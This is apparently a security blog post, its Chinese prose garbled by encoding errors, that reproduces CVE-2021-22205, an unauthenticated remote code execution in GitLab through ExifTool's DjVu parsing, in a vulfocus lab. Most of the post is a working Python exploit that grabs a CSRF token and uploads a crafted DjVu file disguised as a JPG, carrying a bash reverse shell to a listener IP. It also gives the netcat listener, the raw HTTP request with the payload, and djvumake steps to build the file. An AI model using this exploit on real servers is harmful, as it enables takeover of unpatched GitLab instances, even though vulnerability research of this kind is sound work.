---
author: Yuan
date: 2024-03-11 00:40 +0800
categories: [web, ] 
tags: [cms, GitLab, CVE]
img_path: /img/AD/
---

## 0x00 ćźć´çŽäť

ĺ¨ GitLab CE/EE ä¸­ĺç°äşä¸ä¸ŞéŽé˘ďźĺ˝ąĺäşäť 11.9 ĺźĺ§ççćŹăGitLab ć˛Ąćć­ŁçĄŽéŞčŻäź éçťćäťśč§Łćĺ¨çĺžĺćäťśďźčżĺŻźč´äşćŞçťčşŤäť˝éŞčŻçčżç¨ĺ˝äť¤ć§čĄă

**ćźć´ĺ˝ąĺçćŹďź**

> 11.9 <= Gitlab CE/EE < 13.8.8
> 
> 13.9 <= Gitlab CE/EE < 13.9.6
> 
> 13.10 <= Gitlab CE/EE < 13.10.3
{: .prompt-info}

#### 1ăgitlabäťçť

GitLabćŻçąGitLabInc.ĺźĺďźä˝żç¨MITčŽ¸ĺŻčŻçĺşäşç˝çťçGitäťĺşçŽĄçĺˇĽĺˇďźä¸ĺˇćwikiĺissuečˇč¸Şĺč˝ăä˝żç¨Gitä˝ä¸şäťŁç çŽĄçĺˇĽĺˇďźĺšśĺ¨ć­¤ĺşçĄä¸ć­ĺťşčľˇćĽçwebćĺĄă

![ćŞĺž](53f251f94670a4aec3de59c5c0d2912f.png)

ĺŻäťĽçĺ°ĺ¨gitlabççťćä¸­ĺĺŤçĺç§çťäťśďźĺŻäťĽéčżä¸¤ä¸ŞĺłéŽĺĽĺŁčŽżéŽďźĺĺŤćŻHTTP/HTTPS(TCP 80,443)ĺSSH(TCP 22)ďźčŻˇćąéčżnginxč˝Źĺĺ°WorkhorseďźçśĺWorkhorseĺPumačżčĄäş¤äşďźčżéćäťŹçéäťçťä¸éčżWebčŽżéŽççťäťśGitLab Workhorseă

> Puma ćŻä¸ä¸Şç¨äş Ruby ĺşç¨ç¨ĺşççŽĺăĺżŤéăĺ¤çşżç¨ĺéŤĺşŚĺšśĺç HTTP 1.1 ćĺĄĺ¨ďźç¨äşćäžGitLabç˝éĄľĺAPIăäť GitLab 13.0 ĺźĺ§ďźPumaćä¸şäşéťčŽ¤çWebćĺĄĺ¨ďźćżäťŁäşäšĺçUnicornăčĺ¨GitLab 14.0ä¸­ďźUnicorn äťLinux ĺä¸­ĺ é¤ďźĺŞćPumaĺŻç¨ă

čćźć´çćĺ ĺ°ąĺ¨äş`Gitlab Workhorse`ĺ¤çćäťśçčżç¨ä¸­ă

#### 2ăćźć´ćĺ 

ĺ˝ćäťŹĺŠç¨ćĽĺŁ`/uploads/user`ä¸äź ĺžĺćäťśćśďź`GitLab Workhorse`äźĺ°ćŠĺąĺä¸ş`jpgăjpegătiff`ćäťśäź éçť`ExifTool`ăč`ExifTool`ä˝ç¨ĺ¨äşĺ é¤ĺśä¸­ä¸ĺćłçć ç­žăč`ExifTool`ĺ¨č§Łććäťśçćśĺäźĺż˝çĽćäťśçćŠĺąĺďźĺ°čŻć šćŽćäťśçĺĺŽšćĽçĄŽĺŽćäťśçąťĺďźĺśä¸­ćŻćççąťĺćDjVuă

> DjVućŻçąAT&TĺŽéŞĺŽ¤čŞ1996ĺš´čľˇĺźĺçä¸ç§ĺžĺĺçźŠććŻďźĺˇ˛ĺĺąćä¸şć ĺçĺžĺććĄŁć źĺźäšä¸;
> 
> ExifToolćŻä¸ä¸ŞçŹçŤäşĺšłĺ°çPerlĺşďźä¸ćŹžč˝ç¨ä˝ĺ¤ĺč˝ĺžçäżĄćŻćĽçĺˇĽĺˇăĺŻäťĽč§Łćĺşç§ççexifäżĄćŻďźĺŻäťĽçźčžäżŽćšexifäżĄćŻďźç¨ćˇč˝ĺ¤č˝ťćžĺ°čżčĄćĽçĺžĺćäťśçEXIFäżĄćŻďźĺŽçžćŻćexifäżĄćŻçĺŻźĺşă
{: .prompt-info}

ĺłéŽĺ¨äşExifToolĺ¨č§ŁćDjVućł¨éçParseAntĺ˝ć°ä¸­ĺ­ĺ¨ćźć´ďźćäťĽćäťŹĺ°ąĺŻäťĽéčżćé DjVućäťśĺšśćĺĽćśććł¨éĺĺŽšĺ°ĺśćšä¸şjpgĺçźä¸äź ďźĺ ä¸şgitlabĺšśćŞĺ¨čżä¸Şčżç¨ä¸­éŞčŻćäťśĺĺŽšćŻĺŚćŻĺčŽ¸çć źĺźďźćĺčŽŠExifTooläťĽDjVuĺ˝˘ĺźćĽč§Łććäťśďźé ćäşExifTooläťŁç ć§čĄćźć´ă

äťĽä¸çĺĺŽšĺččŞďź [AirSky](https://mp.weixin.qq.com/s/Y4mGVhbc3agp1adnUs1GmA)

## 0x01 ćźć´ĺ¤ç°

ććŻĺŠç¨vulfocusć­ĺťşçŻĺ˘čżčĄĺ¤ç°ă

čżé,ćäťŹĺŻäťĽç´ćĽĺŠç¨ç˝ä¸ĺźćşçä¸äşčćŹ:

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-
import requests
from bs4 import BeautifulSoup

class Exploit():
    __info__ = {
        'name': 'CVE-2021-22205',
        'desription': 'gitlab ćŞććčżç¨ĺ˝äť¤ć§čĄ',
        'references': ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205'],
        'devices': ['gitlab',
                    '11.9=< version <13.8.8',
                    '13.9=< version <13.9.6',
                    '13.10=< version <13.10.3'
        ],
    }


    target = "192.168.31.38"
    port = 43536
    reverseShell = "echo '/bin/bash -i >& /dev/tcp/{}/{} 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh"

    def exploit(self):
        proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
        session = requests.Session()
        session.proxies = proxies
        requests.packages.urllib3.disable_warnings()
        url = "http://{}:{}".format(self.target, self.port)
        try:
            r = session.get(url.strip("/") + "/users/sign_in", verify=False)
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{" + self.reverseShell + "} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                "Connection": "close",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
            flag = 'Failed to process image'
            req = session.post(url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)
            print(session.body)
            x = req.text
            if flag in x:
                return "success!!!"
            else:
                print("[-] Vuln Check Failed... ...")
                return 'failed'
        except Exception as error:
            print(error.with_traceback())
            print("[-] Vuln Check Failed... ...")
            return 'failed'

    def run(self):
        res = self.exploit()
        return res

if __name__ == '__main__':
    exploit = Exploit()
    '''
    ĺ¨GitLab CE/EEä¸­ĺç°ä¸ä¸ŞéŽé˘ďźäť11.9ĺźĺ§ĺ˝ąĺććçćŹă
    GitLabć˛Ąćć­ŁçĄŽĺ°éŞčŻäź éçťćäťśč§Łćĺ¨çĺžĺćäťśďźĺŻźč´čżç¨ĺ˝äť¤ć§čĄ
    ć­¤čćŹĺŠç¨ć­¤ćźć´čżčĄĺĺźšshell, ćľčŻĺčŻˇéç˝ŽĺĽ˝ä¸é˘ç listenIp ĺ listenPort ĺć°
    '''
    exploit.target= "192.168.31.38" # çŽć ćĺĄĺ¨
    exploit.port = 43536      # çŽć çŤŻĺŁ
    listenIp = "192.168.31.38" # ćŹĺ°çĺŹip
    listenPort = "6666"   # ćŹĺ°çĺŹçŤŻĺŁ
    exploit.reverseShell = exploit.reverseShell.format(listenIp,listenPort)
    result = exploit.run()
    print(result)

```
{: file='1.pyl'}

čżé,ćäťŹĺŞéčŚäżŽćšä¸ä¸ĺŠç¨ĺ°ĺĺçŤŻĺŁ ďźčżććŹĺ°çĺŹçĺ°ĺĺçŤŻĺŁă

çśĺďźćäťŹéčŚĺŠç¨ncçĺŹćŹĺ°çŤŻĺŁďź

```bash
nc.exe -lvnp 6666
```

çśĺĺŻĺ¨čćŹďź

```bash
python 1.py
```

äšĺďźĺ°ąĺŻäťĽĺŻäťĽçĺ°shellçĺĺźšäşă

## 0x02 čćŹäťŁç ĺć

čżéďźććŞä¸ćľéĺçĺžçďźäťĽäžżćäťŹĺŻäťĽçĺ°čćŹäťŁç ä¸­ĺéçćľéćĺľďź

```sass
POST /uploads/user HTTP/1.1
Host: 192.168.31.38:43536
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
X-CSRF-Token: BYGxDBZjz3NG0PKDN1lK1fMagmzwzsPNyod+zPUBYlYL9rGDbXJDAS6JJCBMGxQNKD/PIpool1nVPBv159zTew==
Cookie: _gitlab_session=addf2bf61cd6e800858774f8cb8ea0a7; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltUTVOekk0TVRZMUxUTXdObU10TkRkaVpDMWlOemN6TFRSaE5XWmxNREpqTXpWbU5DST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--70dccc24ff47022870ee986c26295ba243fc285e
Content-Length: 971


------WebKitFormBoundaryIMv3mxRg59TkFSX5
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

AT&TFORM  çJVMDIRM   .?    F   ?ďŁľč?!č˘N? äşżĺ Łké°,qé č§§ćŻâ"?FORM   ^DJVUINFO   
   d  INCL   shared_anno.iff BG44    J  ĺŠĺ˛7?*? BG44   éśĄBG44   
FORM   DJVIANTa  P(metadata
	(Copyright "\
" . qx{echo '/bin/bash -i >& /dev/tcp/192.168.31.38/6666 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh} . \
" b ") )                                                                                                                                                                                                                                                                                                                                                                                                                                     

------WebKitFormBoundaryIMv3mxRg59TkFSX5--
```
{: file='ć°ćŽĺ'}

![ćŞĺž](8f00070c63b3c49d089da52c0b7ed354.png)

çśĺďźäťĺžä¸­ĺŻäťĽçĺ°ďźčżéćäťŹĺŠç¨çä¸äź ćĽĺŁçĄŽĺŽćŻ`/uploads/user`ďźé¤ć­¤äšĺ¤ďźäťŁç ćŹčşŤčżéčżčˇĺ`X-CSRF-Token`ĺćŞçťĺ˝`Session`ćĽčżčĄćŞććčŽżéŽă

čä¸äź çć°ćŽĺĺĺŽšďźĺćŻä¸ä¸ŞDjVućäťśçĺĺŽšć źĺźďźĺśä¸­čżĺĺŤäşćäťŹćł¨éçćśćäťŁç ĺĺŽšďźäťĽäžżčŽŠ`ExifTool`ĺŽććçťçäťŁç ć§čĄă

ĺ˝çśďźčżéćäťŹäšĺˇ˛ç´ćĽä˝żç¨`DjVu`ćĽĺĺťşćäťŹçćśćäťŁç ăç¨ćłďźďźĺ¨kaliä¸­ďź

```shell
sudo apt-get install -y djvulibre-bin
```

ĺĺ¤ĺĽ˝ćśćććŹďź

```sass
(metadata
	(Copyright "\
"  qx{echo '/bin/bash -i >& /dev/tcp/{}/{} 0>&1' > /tmp/shell.sh && chmod 777 /tmp/shell.sh && /bin/bash /tmp/shell.sh"} . \
" b ") )
```
{: file='cve.txt'}

ĺśä˝`DjVu`ĺžçć źĺźďź
```shell
djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=rce.txt && mv rce.djvu rce.jpg
```

ćçťjpgéçĺĺŽšä¸şďź
![ćŞĺž](20240311003341298.png)
